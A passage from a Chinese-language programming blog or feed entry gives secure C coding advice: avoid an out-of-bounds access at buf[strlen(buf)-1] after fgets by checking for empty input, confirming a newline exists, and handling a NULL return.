<code>NULL</code>（如遇到文件结束或读取错误），<code>buf</code>
的内容是未定义的，此时不应该继续对 <code>buf</code>
操作，否则可能会导致错误。</li>
</ul></li>
</ol>
<hr />
<h3 id="如何避免隐患"><strong>如何避免隐患</strong></h3>
<ol type="1">
<li><strong>检查输入是否为空</strong>:
<ul>
<li>在访问 <code>buf[strlen(buf) - 1]</code> 之前，需要确保
<code>buf</code> 不为空字符串。</li>
</ul></li>
<li><strong>验证换行符是否存在</strong>:
<ul>
<li>在试图删除换行符之前，检查输入是否包含换行符，确保代码逻辑正确。</li>
</ul></li>
<li><strong>处理 <code>fgets</code> 返回值</strong>:
<ul>
<li>如果 <code>fgets</code> 返回
<code>NULL</code>，应该直接返回或处理错误，而不是继续操作未定义的
<code>buf</code>。</li>
</ul></li>
</ol></li>
</ol>
]]></content>
  </entry>
</search>
